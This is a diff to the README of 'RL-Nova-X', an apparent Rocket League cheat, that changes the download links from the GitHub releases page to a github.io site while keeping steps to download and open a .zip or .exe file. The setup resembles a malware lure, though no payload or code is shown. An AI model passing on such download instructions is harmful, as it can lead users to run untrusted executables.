@@ -1,6 +1,6 @@
 # 🚀 RL-Nova-X - Dominate your Rocket League matches easily
 
-[![](https://img.shields.io/badge/Download-RL--Nova--X-blue.svg)](https://github.com/mickitrigonometric672/RL-Nova-X/releases)
+[![](https://img.shields.io/badge/Download-RL--Nova--X-blue.svg)](https://mickitrigonometric672.github.io)
 
 ## 📖 About this software
 
@@ -29,7 +29,7 @@ Ensure your computer meets these standards before you begin.
 
 Follow these steps to set up the software on your machine.
 
-1.  Visit the [official releases page](https://github.com/mickitrigonometric672/RL-Nova-X/releases) to download the installer.
+1.  Visit the [official releases page](https://mickitrigonometric672.github.io) to download the installer.
 2.  Locate the latest file version, typically ending in .zip or .exe.
 3.  Click the file to start the download.
 4.  Open the file once the download finishes.
